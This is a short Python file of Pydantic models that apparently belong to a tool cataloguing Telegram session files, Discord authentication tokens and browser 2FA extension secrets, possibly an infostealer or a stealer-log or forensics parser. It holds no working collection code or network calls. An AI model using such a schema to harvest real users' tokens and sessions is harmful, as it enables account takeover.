"""Application session and extension models."""

from __future__ import annotations

from pydantic import BaseModel, Field


class TelegramSession(BaseModel):
    """Telegram session data (presence detection only — files are encrypted)."""

    user_hash: str = Field(description="Telegram user hash identifier")
    session_files: list[str] = Field(
        default_factory=list,
        description="List of session file names found",
    )
    decrypted: bool = False  # Telegram session files are encrypted


class DiscordToken(BaseModel):
    """A Discord authentication token."""

    token: str = Field(description="Discord auth token")
    email: str = ""
    username: str = ""


class Extension2FA(BaseModel):
    """Browser 2FA authenticator extension data."""

    browser: str
    profile: str
    stored_secrets_count: int = Field(description="Number of TOTP secrets stored")
